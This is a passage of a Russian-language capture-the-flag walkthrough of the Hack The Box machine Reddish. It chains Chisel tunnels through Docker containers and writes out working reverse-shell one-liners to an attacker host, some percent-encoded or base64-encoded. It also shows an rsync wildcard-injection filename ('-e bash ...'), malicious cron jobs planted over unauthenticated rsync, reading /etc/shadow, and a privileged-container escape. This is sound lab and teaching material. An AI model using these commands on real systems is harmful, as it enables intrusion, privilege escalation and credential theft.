![www-web-shell-hostname.png](/assets/images/htb/machines/reddish/www-web-shell-hostname.png)
{:.center-image}

Раз есть RCE, неплохо было бы получить шелл.

# Докер. Контейнер II: "www"

Неплохо бы, да вот есть одно «но»: хост `www` умеет общаться только с `nodered`, а напрямую связаться с Kali он не может. В таком случае будем создавать очередной туннель (третий по счету) поверх существующего обратного, чтобы через него поймать callback от `www` на Kali. Новый туннель будет прямым (или «локальным»).

```
root@nodered:/tmp# ./chisel client 10.10.14.19:8000 7001:127.0.0.1:9001 &
```

Что здесь произошло: мы подключились к серверу `10.10.14.19:8000` и вместе с этим проложили туннель, который берет начало в 7001-м порту контейнера `nodered`, а заканчивается в 9001-м порту ВМ Kali. Теперь все, что попадет в интерфейс `172.19.0.4:7001` будет автоматически перенаправлено на машину атакующего по адресу `10.10.14.19:9001`. То есть мы сможем собрать реверс-шелл и в качестве цели (`RHOST:RPORT`) указать контейнер `172.19.0.4:7001`, а отклик придет уже на локальную (`LHOST:LPORT`) тачку `10.10.14.19:9001`. Просто как день!

![network-map-4.png](/assets/images/htb/machines/reddish/network-map-4.png)
{:.center-image}

Сетевая карта. Часть 4: Первый туннель до Kali с nodered
{:.quote}

Я добавил две дополнительные строки в скрипт [pwn-redis.sh](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/pwn-redis.sh): «отправить шелл» и «запустить слушателя на порт `9001`».

```bash
...
(sleep 0.1; curl -s -X POST -d 'cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.4%2F7001%200%3E%261%27' localhost:8890/shell.php >/dev/null &)
rlwrap nc -lvnp 9001
```

Пейлоад для `curl` закодирован в [Percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding), чтобы не мучаться с «плохими» символами. Вот так он выглядит в «человеческом» виде.

```bash
bash -c 'bash -i >& /dev/tcp/172.19.0.4/7001 0>&1'
```

Теперь в одно действие получаем сессию на `www`.

![Получение сессии в контейнере www](/assets/images/htb/machines/reddish/www-pwn-redis.gif)
{:.center-image}

Предлагаю осмотреться.

![www-ip-addr.png](/assets/images/htb/machines/reddish/www-ip-addr.png)
{:.center-image}

Во-первых, этот контейнер также имеет доступ в две подсети: `172.19.0.0/16` и `172.20.0.0/16`.

![www-ls.png](/assets/images/htb/machines/reddish/www-ls.png)
{:.center-image}

В корне файловой системы — интересная директория `/backup`, которая встречается довольно часто на виртуалках Hack The Box (да и в реальной жизни тоже). Внтури — скрипт `backup.sh` со следующим содержимым.

```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

Здесь мы видим:

* обращение к пока неизвестному нам хосту `backup`;
* использование [rsync](https://ru.wikipedia.org/wiki/Rsync) для бэкапа всех файлов с расширением `.rdb` (файлы БД Redis) на удаленный сервер `backup`;
* использование rsync для восстановления резервной копии (которая также находится где-то на сервере `backup`) содержимого `/var/www/html/`.

Думаю, уязвимость видна невооруженным взглядом (мы уже делали что-то подобное с [7z](https://snovvcrash.github.io/2019/09/20/htb-ctf.html#honeypodsh)): админ юзает `*` (2-я строка) для обращения ко всем rdb-файлам. А в связки с тем, что в арсенале `rsync` [есть флаг](https://gtfobins.github.io/gtfobins/rsync/#suid) для выполнения команд, это позволяет хакеру создать скрипт с особым именем, идентичным синтаксису для триггера команд, и выполнить какие угодно действия от имени того, кто запускает `backup.sh`.

![www-rsync-help.png](/assets/images/htb/machines/reddish/www-rsync-help.png)
{:.center-image}

Могу поспорить, что скрипт выполняется по планировщику `cron`.

![www-cron-backupsh.png](/assets/images/htb/machines/reddish/www-cron-backupsh.png)
{:.center-image}

Класс, значит, он будет выполнен от имени root! Приступим к эксплуатации.

### Эскалация до root

Сперва в директории `/var/www/html/f187a0ec71ce99642e4f0afbd441a68b` создадим файл `pwn-rsync.rdb`, содержащий обычный реверс-шелл, которые мы сегодня видели уже сотню раз.

```bash
bash -c 'bash -i >& /dev/tcp/172.19.0.4/1337 0>&1'
```

После этого создадим еще один файл там же с оригинальным именем `-e bash pwn-rsync.rdb`. Листинг директории сетевой шары будет выглядеть таким образом в момент перед получением шелла.

```
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ ls
-e bash pwn-rsync.rdb
pwn-rsync.rdb
```

Теперь осталось открыть новую вкладку терминала и дождаться запуска задания `cron`.

![www-root-shell.png](/assets/images/htb/machines/reddish/www-root-shell.png)
{:.center-image}

И вот, у нас есть root-шелл!

**Больше туннелей!**

Как ты понимаешь, отклик реверс-шелла я отправил в контейнер `nodered`, а ловил его на Kali, поэтому прежде всего этого действа, я пробросил еще один локальный туннель на 1337-м порту с `nodered` на свою машину.

```
root@nodered:/tmp# ./chisel client 10.10.14.19:8000 1337:127.0.0.1:1337 &
```

![network-map-5.png](/assets/images/htb/machines/reddish/network-map-5.png)
{:.center-image}

Сетевая карта. Часть 5: Второй туннель до Kali с nodered
{:.quote}

Теперь можно честно забрать хеш юзера.

![www-user-flag.png](/assets/images/htb/machines/reddish/www-user-flag.png)
{:.center-image}

Но это всего лишь пользовательский флаг, а мы по-прежнему находимся внутри docker. Что же теперь?

# Докер. Контейнер III: "backup"

Устройство скрипта для создания резервных копий должно навести тебя на такую мысль: каким образом проходит аутентификация на сервере `backup`? И ответ такой: да, в общем-то, никаким. Доступ к файловой системе этого контейнера может получить кто-угодно, кто сможет дотянуться по сети до `www`.

Мы уже видели вывод `ip addr` для `www` и поняли, что у этого контейнера есть доступ в подсеть `17.20.0.0/24`, однако конкретный адрес сервера `backup` нам все еще неизвестен. Можно сделать предположение о том, что его IP-шник `17.20.0.2` по аналогии с раскладом остальных узлов сети.

Чтобы удостовериться в этом, найдем подтвержение нашему предположению. В файл `/etc/hosts` отсутсвует информация о принадлежности сервера `backup`, однако узнать его адрес можно еще одним способом: отправим всего один ICMP-запрос с `www` до `backup`.

```
www-data@www:/$ ping -c1 backup
ping: icmp open socket: Operation not permitted
```

Делать это нужно из привилигированного шелла, потому что у юзера `www-data` не хватает прав для открытия нужного сокета.

```
root@www:~# ping -c1 backup
PING backup (172.20.0.2) 56(84) bytes of data.
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2): icmp_seq=1 ttl=64 time=0.051 ms

--- backup ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
```

Таким нехитрым способом мы убедились, что адрес `backup` — `172.20.0.2`. Дополним карту сетевых взаимодействий.

![network-map-6.png](/assets/images/htb/machines/reddish/network-map-6.png)
{:.center-image}

Сетевая карта. Часть 6: Локализация контейнера backup
{:.quote}

Теперь вернемся к рассуждению выше: у нас есть доступ к `www` и есть `rsync` без аутентификации (на 873-м порту), следовательно, у нас есть права на чтение/запись в файловую систему `backup`.

Например, я могу просмотреть корень ФС `backup`.

```
www-data@www:/tmp$ rsync rsync://backup:873/src/
...
```

![www-rsync-read-root.png](/assets/images/htb/machines/reddish/www-rsync-read-root.png)
{:.center-image}

Или прочитать файл `shadow`.

```
www-data@www:/tmp$ rsync -a rsync://backup:873/etc/shadow .
www-data@www:/tmp$ cat shadow
...
```

![www-rsync-read-shadow.png](/assets/images/htb/machines/reddish/www-rsync-read-shadow.png)
{:.center-image}

А также записать любой файл в любую директорию на `backup`.

```
www-data@www:/tmp$ echo 'HELLO THERE' > .test
www-data@www:/tmp$ rsync -a .test rsync://backup:873/etc/
-rw-r--r--             12 2020/02/02 16:25:49 .test
```

![www-rsync-write-test-file.png](/assets/images/htb/machines/reddish/www-rsync-write-test-file.png)
{:.center-image}

Попробуем таким образом получить шелл: я создам вредоносную задачу cron с реверс-шеллом, запишу ее в `/etc/cron.d/` на сервере `backup` и поймаю отклик на Kali. Но у нас очередная проблема сетевой доступности: `backup` умеет говорить только с `www`, а `www` только с `nodered`... Да, ты правильно понимаешь, придется строить **цепочку** туннелей: от `backup` до `www`, от `www` до `nodered` и от `nodered` до Kali.

## Получение root-шелла

Следуя принципам динамического программирования, декомпозируем сложную задачу построения такого многосоставного туннеля на две простые подзадачи, а в конце объединим результаты:

1\. Пробрасываем локальный порт `1111` из контейнера `nodered` до порта `8000` на Kali, на котором работает сервер Chisel. Это позволит нам обращаться к `172.19.0.4:1111` как к серверу Chisel на Kali.

```
root@nodered:/tmp# ./chisel client 10.10.14.19:8000 1111:127.0.0.1:8000 &
```

2\. Вторым шагом настроим переадресацию с `www` на Kali. Для этого подключимся к `172.19.0.4:1111` (то же самое, как если бы мы могли подключиться к Kali напрямую) и пробросим локальный порт `2222` до порта `3333` на Kali.

```
www-data@www:/tmp$ ./chisel client 172.19.0.4:1111 2222:127.0.0.1:3333 &
```

Теперь все, что попадет в порт `2222` на `www`, будет перенаправлено по цепочке туннелей через контейнер `nodered` в порт `3333` на машину атакующего.

![network-map-7.png](/assets/images/htb/machines/reddish/network-map-7.png)
{:.center-image}

Сетевая карта. Часть 7: Цепочка туннелей "www <=> nodered <=> Kali"
{:.quote}

Для некоторых утилитарных целей (например, доставить исполняемый файл `chisel` в контейнер `www`), было открыто еще 100500 вспомогательных туннелей, описание которых я не стал включать в текст прохождения и добавлять на сетевую карту, чтобы не запутывать читателя еще больше.

Остается создать реверс-шелл, cron-задачу, залить это все на `backup`, дождаться запуска cron-а и поймать шелл на Kali. Сделаем же это.

Создаем шелл.

```
root@www:/tmp# echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzIyMjIgMD4mMScK | base64 -d > shell.sh
root@www:/tmp# cat shell.sh
`bash -c 'bash -i >& /dev/tcp/172.20.0.3/2222 0>&1'
```

Создаем cronjob, который будет выполняться каждую минуту.

```
root@www:/tmp# echo '* * * * * root bash /tmp/shell.sh' > shell
```

Заливаем оба файла на `backup` с помощью `rsync`.

```
root@www:/tmp# rsync -a shell.sh rsync://backup:873/src/tmp/
root@www:/tmp# rsync -a shell rsync://backup:873/src/etc/cron.d/
```

И через мгновение нам приходит коннект на 3333-й порт Kali.

![backup-root-shell.png](/assets/images/htb/machines/reddish/backup-root-shell.png)
{:.center-image}

# Финальный захват хоста Reddish

Прогулявшись по файловой системе `backup`, можно увидеть такую картину.

![backup-dev-sda.png](/assets/images/htb/machines/reddish/backup-dev-sda.png)
{:.center-image}

В директории `/dev` оставлен доступ ко всем накопителям хостовой ОС. Это означает, что на Reddish этот контейнер был запущен с флагом [--privileged](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities). Это наделяет докер-процесс практически всеми полномочиями, которые есть у основного хоста.

Интересная презентация по аудиту докер-контейнеров: [Hacking Docker the Easy way](https://www.slideshare.net/BorgHan/hacking-docker-the-easy-way).

Если мы смонтируем, к примеру, `/dev/sda1`, то сможем совершить побег в файловую систему Reddish.

![backup-mount-sda1.png](/assets/images/htb/machines/reddish/backup-mount-sda1.png)
{:.center-image}

Шелл можно получить тем же способом, каким мы попали в контейнер `backup`: создадим cronjob и дропнем его в `/dev/sda1/etc/cron.d/`.

```
root@backup:/tmp/sda1/etc/cron.d# echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS85OTk5IDA+JjEnCg==' | base64 -d > /tmp/sda1/tmp/shell.sh
root@backup:/tmp/sda1/etc/cron.d# cat ../../tmp/shell.sh
bash -c 'bash -i >& /dev/tcp/10.10.14.19/9999 0>&1'
root@backup:/tmp/sda1/etc/cron.d# echo '* * * * * root bash /tmp/shell.sh' > shell
```

И теперь отклик реверс-шелла придет уже человеческим образом — через реальную сеть `10.10.0.0/16` (а не через дебри виртуальных интерфейсов докера) на порт `9999` ВМ Kali.

![reddish-root-shell.png](/assets/images/htb/machines/reddish/reddish-root-shell.png)
{:.center-image}

Если вызвать `ip addr`, можно видеть нагромождение сетей docker.

![reddish-ip-addr.png](/assets/images/htb/machines/reddish/reddish-ip-addr.png)
{:.center-image}

Вот и все! Осталось забрат рутовый флаг, и виртуалка пройдена.

```
root@backup:/tmp/sda1# cat root/root.txt
cat root/root.txt
50d0db64????????????????????????
```

![trophy.png](/assets/images/htb/machines/reddish/trophy.png)
{:.center-image}

# Эпилог

## Конфигурация docker

У нас есть полноправный доступ к системе, поэтому из любопытства можно открыть конфигурацию docker [/opt/reddish_composition/docker-compose.yml](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml).

Из нее мы видим:

* список портов, доступных «снаружи» ([строка 7](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml#L7));
* разделяемую с контейнерами `www` и `redis` внутреннюю сеть ([строка 10](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml#L10));
* конфигурации всех контейнеров (`nodered`, `www`, `redis`, `backup`);
* флаг `--privileged`, с которым запущен контейнер `backup` ([строка 38](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml#L38)).

В соответствии с найденным конфигом я в последний раз обновлю свою сетевую карту.

![network-map-8.png](/assets/images/htb/machines/reddish/network-map-8.png)
{:.center-image}

Сетевая карта. Часть 8: Файловая система Reddish
{:.quote}

## Chisel SOCKS

Откровенно говоря, Reddish можно было пройти гораздо проще, ведь Chisel поддерживает SOCKS-прокси. Это значит, что нам вообще-то не нужно было вручную возводить отдельный туннель под каждый пробрасываемый порт. Безусловно, это полезно в учебных целях, чтобы понимать, как это все работает (за этим мы это и делали), однако настройка прокси-сервера значительно упрощает жизнь пентестеру.

Единственная трудность заключается в том, что Chisel умеет запускать режим SOCKS-сервера только в режиме `chisel server`. То есть нам нужно было бы положить Chisel на промежуточный хост (например, на `nodered`), запустить его в режиме сервера и подключаться к этому серверу с Kali. Но именно это мы и не могли сделать! Как ты помнишь, мы специально сперва пробрасывали реверс-соединение к себе на машину, чтобы взаимодействовать со внутренней сетью докер-контейнеров.

Но и здесь есть выход: можно запустить «Chisel поверх Chisel» так, чтобы первый Chisel вел себя как обычный сервер, который организует нам backconnect к `nodered`, а второй — вел себя как сервер SOCKS-прокси уже в самом контейнере `nodered`. Продемонстрируем это на примере.

```
root@kali:~/chisel# ./chisel server -v -reverse -p 8000
```

Первым делом, как обычно, запускаем сервер на Kali, который разрешает обратные подключения.

```
root@nodered:/tmp# ./chisel client 10.10.14.19:8000 R:127.0.0.1:8001:127.0.0.1:31337 &
```

Потом делаем обратный проброс с `nodered` (порт `31337`) на Kali (порт `8001`). На данном этапе все, что попадает на Kali через `localhost:8001`, отправляется в `nodered` на `localhost:31337`.

```
root@nodered:/tmp# ./chisel server -v -p 31337 --socks5
```

Следующим шагом запускаем Chisel в режиме SOCKS-сервера на `nodered` слушать порт `31337`.

```
root@kali:~/chisel# ./chisel client 127.0.0.1:8001 1080:socks
```

В завершении активируем дополнительный клиент Chisel на Kali (со значением `socks` в качестве remote), который подключается к локальному порту `8001`. А дальше начинается магия: трафик передается через порт `1080` SOCKS-прокси по обратному туннелю, который обслуживает первый сервер на 8000-м порту, и попадает на интерфейс `127.0.0.1` контейнера `nodered` в порт `31337`, где уже развернут SOCKS-сервер. Фух.

С этого момента мы можем обращаться к любому хосту по любому порту, до которых может дотянутся `nodered`, а SOCKS-прокси выполнит всю маршрутизацию за нас.

```
root@kali:~# proxychains4 nmap -n -Pn -sT -sV -sC 172.19.0.3 -p6379
...
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
...
```
